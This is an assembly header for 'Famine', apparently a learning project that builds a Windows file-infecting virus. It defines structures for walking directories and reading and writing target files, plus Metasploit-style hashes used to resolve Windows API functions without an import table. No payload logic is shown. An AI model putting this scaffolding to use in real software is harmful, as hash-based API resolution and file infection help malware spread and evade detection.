; *** DEFINES ***
; Famine Define ---
%define FAMINE_SIZE (end - main)

; Syscall Const Define ---
%define PATH_MAX 4096

; WIN Offset
%define DLL_NAME_OFF 0x58

; *** STRUCTURES ***
%define SGET_PROC(x) [(rbp - s_proc_size) + x]
struc s_proc
    .target_hash resd 1
    .export_table resd 1

    .dll_base resd 1 ; LDR_DATA_TABLE_ENTRY base address
    .dll_hash resd 1
endstruc

; Struct of functions table
    struc s_add_tbl
        .local_alloc             resq 1
        .local_free              resq 1
        .exit_process            resq 1
        .create_file_a           resq 1
        .get_file_size           resq 1
        .read_file               resq 1
        .write_file              resq 1
        .close_handle            resq 1
        .find_first_file_a       resq 1
        .find_next_file_a        resq 1
        .set_current_directory_a  resq 1
        .get_current_directory_a  resq 1
        .get_module_handle_a      resq 1
    endstruc

; Global struct for Famine logic ---
    %define SGET(x) [(rbp - s_famine_size) + x]
    struc s_famine
        .dir_fd resq 1

        .file_path resb PATH_MAX
        
        .search_handle resq 1 ; handle of file
        .file_handle resq 1 ; handle of copy of the targeted file
        .file_size resd 1 ; size of the file
        .s_find_data resb WIN32_FIND_DATA_size
        
        .s_address_table resb s_add_tbl
    endstruc

; WIN STRUCT
struc WIN32_FIND_DATA
.dwFileAttributes     resd 1         ; DWORD (4 bytes)
.ftCreationTime       resd 2         ; FILETIME (2 DWORDs = 8 bytes)
.ftLastAccessTime     resd 2         ; FILETIME (8 bytes)
.ftLastWriteTime      resd 2         ; FILETIME (8 bytes)
.nFileSizeHigh        resd 1         ; DWORD (4 bytes)
.nFileSizeLow         resd 1         ; DWORD (4 bytes)
.dwReserved0          resd 1         ; DWORD (4 bytes)
.dwReserved1          resd 1         ; DWORD (4 bytes)
.cFileName            resb 260       ; TCHAR cFileName[MAX_PATH] (260 bytes)
.cAlternateFileName   resb 14        ; TCHAR cAlternateFileName[14] (14 bytes)
endstruc


; *** Function Hashese ***
; https://github.com/snus-b/Metasploit_Function_Hashes
    %define local_alloc_hash             0x528176EE
    %define local_free_hash              0xEA61FCB1
    %define exit_process_hash            0x56A2B5F0
    %define create_file_a_hash           0x4FDAF6DA
    %define get_file_size_hash           0x701E12C6
    %define read_file_hash               0xBB5F9EAD
    %define write_file_hash              0x5BAE572D
    %define close_handle_hash            0x528796C6
    %define find_first_file_a_hash       0x95DA3590
    %define find_next_file_a_hash        0xF76C45E7
    %define set_current_directory_a_hash 0xAD2D1512
    %define get_current_directory_a_hash 0xED2D1511
    %define get_module_handle_a_hash     0xDAD5B06C



